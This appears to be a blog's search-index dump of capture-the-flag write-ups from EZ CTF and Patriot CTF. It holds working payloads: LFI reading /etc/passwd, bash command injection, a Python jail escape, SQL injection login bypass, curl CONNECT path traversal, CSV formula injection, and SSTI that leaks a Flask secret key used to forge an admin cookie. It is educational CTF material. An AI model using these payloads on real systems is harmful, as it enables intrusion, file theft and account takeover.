www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin Then, I try to display the content of the robots.txt file:\nhttp://ez.ctf.cafe:9999/blog-posts.php?file=robots.txt User-agent: * Disallow: /flag.php With the robots.txt file, I now know that there is a flag.php file.\nBut when I try to display the content of the file, there is only the sentence: How do you filter your coffee?\nSo I will use PHP wrappers to get the content of the flag.php file in base64:\nhttp://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php I get the value:\nPD9waHAKCWVjaG8gJ0hvdyBkbyB5b3UgZmlsdGVyIHlvdXIgY29mZmVlPyc7ICAgIAoJLy8gRVotQ1RGe0xGSV8xU18zWn0KPz4K After decoding the string:\n\u0026lt;?php echo \u0026#39;How do you filter your coffee?\u0026#39;; // EZ-CTF{LFI_1S_3Z} ?\u0026gt; Flag: EZ-CTF{LFI_1S_3Z}\n","permalink":"https://sanlokii.eu/writeups/ez-ctf/i-made-a-blog/","summary":"Statement: Did you check out my blog posts?\nBrowsing the blog, we can see that each article is passed as an argument to the file parameter.\nSo I decide to try to exploit LFI to retrieve files stored on the web server.\nI start by retrieving the value of the /etc/passwd file to test if the server is vulnerable:\nhttp://ez.ctf.cafe:9999/blog-posts.php?file=../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin Then, I try to display the content of the robots.","title":"EZ CTF : I made a blog!"},{"content":"Statement: Read the flag!\nFor this challenge, I need to connect to the remote server.\nOnce connected, we are on a bash shell with the return: Are you root?\nSending a single value or command closes the shell and the connection to the server.\nSo I\u0026rsquo;m just trying to add a ; to inject a command: ;ls:\nentrypoint.sh flag.txt pwn.sh ucspi-tcp-0.88 ucspi-tcp-0.88.errno.patch ucspi-tcp-0.88.tar.gz I just have to read the content of the file flag.txt: ;cat flag.txt\nFlag: EZ-CTF{UNSECUR3_B4SH}\n","permalink":"https://sanlokii.eu/writeups/ez-ctf/mario-bros/","summary":"Statement: Read the flag!\nFor this challenge, I need to connect to the remote server.\nOnce connected, we are on a bash shell with the return: Are you root?\nSending a single value or command closes the shell and the connection to the server.\nSo I\u0026rsquo;m just trying to add a ; to inject a command: ;ls:\nentrypoint.sh flag.txt pwn.sh ucspi-tcp-0.88 ucspi-tcp-0.88.errno.patch ucspi-tcp-0.88.tar.gz I just have to read the content of the file flag.","title":"EZ CTF : Mario bros!!"},{"content":"Statement: Bowser has kidnapped Peach! Help her break out the python is near!\nOnce connected to the challenge, I find myself on a python shell.\nI start by displaying the contents of the globals: print(globals())\n{ \u0026#39;builtins\u0026#39;: \u0026lt;module \u0026#39;builtin\u0026#39; (built-in)\u0026gt;, \u0026#39;file\u0026#39;: \u0026#39;./jail.py\u0026#39;, \u0026#39;package\u0026#39;: None, \u0026#39;name\u0026#39;: \u0026#39;main\u0026#39;, \u0026#39;main\u0026#39;: \u0026lt;function main at 0x7f0435b92758\u0026gt;, \u0026#39;doc\u0026#39;: None} Then, I display the subclasses:\n\u0026lt;type \u0026#39;type\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakref\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakcallableproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;int\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;basestring\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;bytearray\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;list\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NoneType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NotImplementedType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;traceback\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;super\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;xrange\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;set\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;slice\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;staticmethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;complex\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;float\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;buffer\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;long\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frozenset\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;property\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;memoryview\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;tuple\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;enumerate\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;reversed\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;code\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frame\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instancemethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;function\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;classobj\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dictproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;generator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;getset_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instance\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;ellipsis\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;member_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;file\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;PyCapsule\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;cell\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;callable-iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.long_info\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.float_info\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;EncodingMap\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;fieldnameiterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;formatteriterator\u0026#39;\u0026gt; I notice that the class \u0026lt;type 'file'\u0026gt; is present.\nSo I will adjust my python payload to use this subclass:\nprint(().class.base.subclasses()[40]) The value [40] corresponds to the subclass file.\nSo I decide to read the content of the file jail.py:\nprint(().class.base.subclasses()[40](\u0026#39;jail.py\u0026#39;).read()) def main(): text=raw_input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) for keyword in [\u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;import\u0026#39;]: if keyword in text: print(\u0026#34;Bowser no likey likey!\u0026#34;) return; else: exec(text) main() return; if name == \u0026#34;main\u0026#34;: main() The python script doesn\u0026rsquo;t give me any information about the file to retrieve, so I try to read the content of the flag.txt file:\nprint(().class.base.subclasses()[40](\u0026#39;flag.txt\u0026#39;).read()) Flag: EZ-CTF{P34CH_H4S_B33N_S4V3D}\nFor the anecdote, a simple import os;os.system('cmd'); was enough to inject commands !\n","permalink":"https://sanlokii.eu/writeups/ez-ctf/save-peach/","summary":"Statement: Bowser has kidnapped Peach! Help her break out the python is near!\nOnce connected to the challenge, I find myself on a python shell.\nI start by displaying the contents of the globals: print(globals())\n{ \u0026#39;builtins\u0026#39;: \u0026lt;module \u0026#39;builtin\u0026#39; (built-in)\u0026gt;, \u0026#39;file\u0026#39;: \u0026#39;./jail.py\u0026#39;, \u0026#39;package\u0026#39;: None, \u0026#39;name\u0026#39;: \u0026#39;main\u0026#39;, \u0026#39;main\u0026#39;: \u0026lt;function main at 0x7f0435b92758\u0026gt;, \u0026#39;doc\u0026#39;: None} Then, I display the subclasses:\n\u0026lt;type \u0026#39;type\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakref\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakcallableproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;weakproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;int\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;basestring\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;bytearray\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;list\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NoneType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;NotImplementedType\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;traceback\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;super\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;xrange\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dict\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;set\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;slice\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;staticmethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;complex\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;float\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;buffer\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;long\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frozenset\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;property\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;memoryview\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;tuple\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;enumerate\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;reversed\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;code\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;frame\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instancemethod\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;function\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;classobj\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;dictproxy\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;generator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;getset_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;instance\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;ellipsis\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;member_descriptor\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;file\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;PyCapsule\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;cell\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;callable-iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;iterator\u0026#39;\u0026gt;, \u0026lt;type \u0026#39;sys.","title":"EZ CTF : Save Peach!"},{"content":"Statement: This is so unbreakable!\nThe challenge is to bypass authentication via an SQLi.\nI start by testing short payloads to find an entry point.\nI get an interesting error with a simple ' :\nCould not successfully run query (SELECT * FROM members WHERE username = \u0026#39;\u0026#39;\u0026#39; AND password = \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39;) from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39;\u0026#39; at line 1 Thanks to the errors returned by the server, I can build my payload.\nSo I try to exploit the SQLi with a UNION query: 1' UNION SELECT null-- -\nCould not successfully run query (SELECT * FROM members WHERE username = \u0026#39;1\u0026#39; UNION SELECT null-- -\u0026#39; AND password = \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39;) from DB: The used SELECT statements have a different number of columns The error message returned informs us that there are several columns.\nSo I will adjust my payload to satisfy the number of columns by adding null values:\n1\u0026#39; UNION SELECT null,null,null-- - Flag : EZ-CTF{N0t_S0_S4f3_4ft3r_411}\n","permalink":"https://sanlokii.eu/writeups/ez-ctf/super-secure/","summary":"Statement: This is so unbreakable!\nThe challenge is to bypass authentication via an SQLi.\nI start by testing short payloads to find an entry point.\nI get an interesting error with a simple ' :\nCould not successfully run query (SELECT * FROM members WHERE username = \u0026#39;\u0026#39;\u0026#39; AND password = \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39;) from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39;\u0026#39; at line 1 Thanks to the errors returned by the server, I can build my payload.","title":"EZ CTF : Super Secure"},{"content":"Statement: Who needs Flask when you have Golang \u0026ndash; the new meta for web applications.\nTake a look at this super sleek and functional website.\nUpon connecting to this URL, we come across the index.hmtl page with the following source code:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Curly Fry\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;I will release my secret curly fry recipe when I am ready. For now it is safely held in my /root directory\u0026lt;/h2\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; One suspects that one must access a file in the /root directory.\nThere is an exploit that allows to access unauthorized resources with a CONNECT request on web servers in Golang.\nI first try to access the file /etc/passwd via curl :\ncurl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../etc/passwd Via the request, I can access the desired file, however it is impossible to execute a command to list the contents of the /root directory.\nAfter reading the HTML source code a lot, I discover the existence of the recipe.txt file (guessing !)\nSo I run my curl command again with the full path and I get the content:\ncurl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt Flag: PCTF{tru5t_m3_im_4_ch3f}\n","permalink":"https://sanlokii.eu/writeups/patriotctf/curly-fry/","summary":"Statement: Who needs Flask when you have Golang \u0026ndash; the new meta for web applications.\nTake a look at this super sleek and functional website.\nUpon connecting to this URL, we come across the index.hmtl page with the following source code:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Curly Fry\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;I will release my secret curly fry recipe when I am ready. For now it is safely held in my /root directory\u0026lt;/h2\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; One suspects that one must access a file in the /root directory.","title":"Patriot CTF : Curly Fry"},{"content":"Statement: I am creating the next big social networking platform, but I am used to setting up unsecured software.\nIf you can login to the admin user, I will give you the flag.\nI\u0026rsquo;m testing this new database architecture and it\u0026rsquo;s so beautiful I\u0026rsquo;ll let you look at the code.\nMaking the source code available main.py:\nimport os from flask import render_template, redirect, request, session, flash, url_for from openpyxl import load_workbook import subprocess import pandas as pd from app import app, USERNAMES, PASSWORDS def add_user(username, password): DB = load_workbook(filename=\u0026#34;db.xlsx\u0026#34;) Users = DB[\u0026#34;Users\u0026#34;] new_row = Users.max_row + 1 Users[f\u0026#34;{USERNAMES}{new_row}\u0026#34;] = username Users[f\u0026#34;{PASSWORDS}{new_row}\u0026#34;] = password DB.save(filename=\u0026#34;db.xlsx\u0026#34;) def read_db() -\u0026gt; pd.DataFrame: subprocess.Popen([\u0026#34;libreoffice\u0026#34;, \u0026#34;--headless\u0026#34;, \u0026#34;--convert-to\u0026#34;, \u0026#34;csv\u0026#34;, \u0026#34;db.xlsx\u0026#34;], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT).communicate() df = pd.read_csv(\u0026#34;db.csv\u0026#34;) return df @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;]) def base(): if not session.get(\u0026#34;username\u0026#34;): return redirect(url_for(\u0026#34;login\u0026#34;)) else: Users = read_db() username = session.get(\u0026#34;username\u0026#34;) password = Users.query(f \u0026#34;Username == \u0026#39;{username}\u0026#39;\u0026#34;)[\u0026#34;Password\u0026#34;].values[0] return render_template(\u0026#39;index.html\u0026#39;, name=username, password=password) @app.route(\u0026#34;/admin\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def admin(): username = session.get(\u0026#34;username\u0026#34;) if username != \u0026#34;admin\u0026#34;: return redirect(\u0026#34;/\u0026#34;) else: return render_template(\u0026#34;admin.html\u0026#34;, name=username) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;login.html\u0026#34;) else: username = request.form.get(\u0026#34;username\u0026#34;) password = request.form.get(\u0026#34;password\u0026#34;) Users = read_db() if username not in Users.Username.values: flash(\u0026#39;Please check your login details and try again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) elif password != Users.query(f \u0026#34;Username == \u0026#39;{username}\u0026#39;\u0026#34;)[\u0026#34;Password\u0026#34;].values[0]: flash(\u0026#39;Please check your login details and try again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) session[\u0026#34;username\u0026#34;] = request.form.get(\u0026#34;username\u0026#34;) return redirect(\u0026#34;/\u0026#34;) @app.route(\u0026#39;/signup\u0026#39;, methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def signup(): if request.method==\u0026#39;POST\u0026#39;: username = request.form.get(\u0026#34;username\u0026#34;) password = request.form.get(\u0026#34;password\u0026#34;) Users = read_db() if username in Users.Username.values: flash(\u0026#39;Username already exists\u0026#39;) return redirect(url_for(\u0026#39;signup\u0026#39;)) else: add_user(username, password) session[\u0026#34;username\u0026#34;] = username return redirect(\u0026#34;/\u0026#34;) else: return render_template(\u0026#39;signup.html\u0026#39;) @app.route(\u0026#39;/logout\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def logout(): if request.method==\u0026#39;GET\u0026#39;: username = session.get(\u0026#34;username\u0026#34;) session.pop(\u0026#39;username\u0026#39;, default=None) return redirect(\u0026#34;/\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: for f in os.listdir(\u0026#34;flask_session\u0026#34;): os.remove(os.path.join(\u0026#34;flask_session\u0026#34;, f)) app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;, threaded=True) Reading the source code, we can see that the database used is the file db.xlsx.\nWe will have to bypass the authentication via a CSVi (CSV Injection).\nWhen creating an account, we can see that the web page displays our password when we are authenticated.\nThe goal is to inject our payload on the password field in order to get the password of the admin account.\nI connect with my account and I use the following payload in the password field:\n=CONCATENATE(A1:B1) Once authenticated, the site tells me that my password is UsernamePassword.\nThis looks very much like column headers, so I try to authenticate with the payload:\n=CONCATENATE(A2:B2) I get the password for the admin account, now I just have to authenticate with the credentials admin:SuperStrongPassword to get the flag.\nFlag: PCTF{Exc3l_is_th3_b3st_d4t4b4s3}\n","permalink":"https://sanlokii.eu/writeups/patriotctf/excellent-database/","summary":"Statement: I am creating the next big social networking platform, but I am used to setting up unsecured software.\nIf you can login to the admin user, I will give you the flag.\nI\u0026rsquo;m testing this new database architecture and it\u0026rsquo;s so beautiful I\u0026rsquo;ll let you look at the code.\nMaking the source code available main.py:\nimport os from flask import render_template, redirect, request, session, flash, url_for from openpyxl import load_workbook import subprocess import pandas as pd from app import app, USERNAMES, PASSWORDS def add_user(username, password): DB = load_workbook(filename=\u0026#34;db.","title":"Patriot CTF : Excellent Database"},{"content":"Statement: My website has been completely secured! !! No matter how good a hacker you are, you will not be able to hack my site!!!\nTODO: Put the URL of the website.\nI start by fuzzing the site with ffuf tool:\nffuf -w ~/fuzz-Bo0oM.txt -u http://chall1.pctf.competitivecyber.club:10017/FUZZ Thanks to the fuzzing, I know that there is a /admin directory.\nSo I inspect the source code of the /admin/index.html file and I notice a link to the main.js file.\nSource code of main.js:\nvar pages = { home: \u0026#34;Welcome to my completely unhackable site. There are no flags here, so don\u0026#39;t even bother trying to look for them lol.\u0026#34;, about: \u0026#34;This site is 100% completely utterly unhackable, and anyone who says anything otherwise is an idiot who knows nothing about cybersecurity.\u0026#34;, contact: \u0026#34;Do you want to get the flag? If you do, then contact me at hahahahah.jk.im.not.giving.you.the.flag@lol.com.\u0026#34; }; function getContent(fragmentId, callback){ callback(pages[fragmentId]); } function loadContent(){ var contentDiv = document.getElementById(\u0026#34;app\u0026#34;), fragmentId = location.hash.substr(1); getContent(fragmentId, function (content) { contentDiv.innerHTML = content; }); } var thing = atob(atob(atob(\u0026#34;VERKR2EySlhiSFZNTUVaTVUydFNWRk5yV2t4U1JrNUxWRVZHVkZKcE9YSmpNbmhyWVcxYWRtRlhSbXRqTWxsMVpFaG9NQT09\u0026#34;)); fetch(thing).then(function(response) { return response.text(); }).then(function(data) { pages[\u0026#34;secret\u0026#34;] = data; if(!location.hash) { location.hash = \u0026#34;#home\u0026#34;; } loadContent(); window.addEventListener(\u0026#34;hashchange\u0026#34;, loadContent) }); I notice that there is a variable containing a base64 encoding:\nvar thing = atob(atob(\u0026#34;VERKR2EySlhiSFZNTUVaTVUydFNWRk5yV2t4U1JrNUxWRVZHVkZKcE9YSmpNbmhyWVcxYWRtRlhSbXRqTWxsMVpFaG9NQT09\u0026#34;)); Then I use the following command to decode multiple base64 encoding:\necho -n \u0026#34;VERKR2EySlhiSFZNTUVaTVUydFNWRk5yV2t4U1JrNUxWRVZHVkZKcE9YSmpNbmhyWVcxYWRtRlhSbXRqTWxsMVpFaG9NQT09\u0026#34; | base64 -d | base64 -d | base64 -d I get back this value corresponding to a path : /admin/AKJDSJFKDSJLASF/ksldjfoiadsf.txt\nFlag: pctf{Th3_W3bsite_w@s_UnL0cK3d}\n","permalink":"https://sanlokii.eu/writeups/patriotctf/locked/","summary":"Statement: My website has been completely secured! !! No matter how good a hacker you are, you will not be able to hack my site!!!\nTODO: Put the URL of the website.\nI start by fuzzing the site with ffuf tool:\nffuf -w ~/fuzz-Bo0oM.txt -u http://chall1.pctf.competitivecyber.club:10017/FUZZ Thanks to the fuzzing, I know that there is a /admin directory.\nSo I inspect the source code of the /admin/index.html file and I notice a link to the main.","title":"Patriot CTF : Locked"},{"content":"Statement: I am creating the next big social networking platform, but I have a history of setting up unsecured software.\nIf you can log in to the admin user, I will give you the flag.\nSomeone hacked my site after I read his message, so I don\u0026rsquo;t read the DMs sent to me anymore! \u0026gt; :(\nOn top of that, I\u0026rsquo;m imposing an even stricter special character filter because I don\u0026rsquo;t really know how to patch my code.\np.s. To save you time, don\u0026rsquo;t try to get a reverse shell\nWhen logging into the site, you can see that the session cookie is a Flask cookie:\n.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q I start by decoding the cookie with flask-unsign:\nflask-unsign --decode --cookie \u0026#39;eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF- TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q\u0026#39; Cookie value:\n{\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: \u0026#39;ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827\u0026#39;, \u0026#39;_user_id\u0026#39;: \u0026#39;2\u0026#39;} We can see that the value _user_id is 2. It is very likely that the value 1 is the administrator account.\nI then try to brute force the cookie by dictionary attack but not conclusively:\nflask-unsign --unsign --cookie \u0026#34;. eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q\u0026#34; --wordlist ~/rockyou.txt --no-lit eral-eval We are missing the key to sign our Flask cookie, so I decide to look at the web server side to get this value.\nOn the message sending page, I notice that a SSTI (Server Side Template Injection) flaw is exploitable thanks to a simple payload: {{7*'7'}}\nSo I\u0026rsquo;ll try to recover the server configuration by injecting the payload {{config}}:\nJust sent your message: \u0026lt;Config {\u0026#39;ENV\u0026#39;: \u0026#39;production\u0026#39;, DEBUG\u0026#39;: False, \u0026#39;TESTING\u0026#39;: False, PROPAGATE_EXCEPTIONS\u0026#39;: None, PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;: None, SECRET_KEY\u0026#39;: \u0026#39;qHIMoRzDyjmWXmtOVYXRUomyOiBaNd\u0026#39;, \u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;: datetime.timedelta(days=31), USE_X_SENDFILE\u0026#39;: False, \u0026#39;SERVER_NAME\u0026#39;: None, \u0026#39;APPLICATION_ROOT\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;SESSION_COOKIE_NAME\u0026#39;: \u0026#39;session\u0026#39;, \u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;: False, \u0026#39;SESSION_COOKIE_PATH\u0026#39;: None, \u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;: False, \u0026#39;SESSION_COOKIE_SECURE\u0026#39;: False, \u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;: None, \u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;: True, \u0026#39;MAX_CONTENT_LENGTH\u0026#39;: None, \u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;: datetime.timedelta(seconds=43200), TRAP_BAD_REQUEST_ERRORS\u0026#39;: None, TRAP_HTTP_EXCEPTIONS\u0026#39;: False, EXPLAIN_TEMPLATE_LOADING\u0026#39;: False, \u0026#39;PREFERRED_URL_SCHEME\u0026#39;: \u0026#39;http\u0026#39;, \u0026#39;JSON_AS_ASCII\u0026#39;: True, \u0026#39;JSON_SORT_KEYS\u0026#39;: True, \u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;: False, \u0026#39;JSONIFY_MIMETYPE\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;: None, \u0026#39;MAX_COOKIE_SIZE\u0026#39;: 4093, \u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;: \u0026#39;sqlite:///db.sqlite\u0026#39;, \u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;: False, \u0026#39;UPLOAD_FOLDER\u0026#39;: \u0026#39;/app/app/uploads\u0026#39;, \u0026#39;SQLALCHEMY_BINDS\u0026#39;: None, \u0026#39;SQLALCHEMY_NATIVE_UNICODE\u0026#39;: None, \u0026#39;SQLALCHEMY_ECHO\u0026#39;: False, \u0026#39;SQLALCHEMY_RECORD_QUERIES\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_SIZE\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_TIMEOUT\u0026#39;: None, \u0026#39;SQLALCHEMY_POOL_RECYCLE\u0026#39;: None, \u0026#39;SQLALCHEMY_MAX_OVERFLOW\u0026#39;: None, \u0026#39;SQLALCHEMY_COMMIT_ON_TEARDOWN\u0026#39;: False, \u0026#39;SQLALCHEMY_ENGINE_OPTIONS\u0026#39;: {}}\u0026gt; I get the value of the key 'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd' and change the cookie to match the admin account:\nflask-unsign --sign --cookie \u0026#34;{\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: \u0026#39;ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827\u0026#39;, 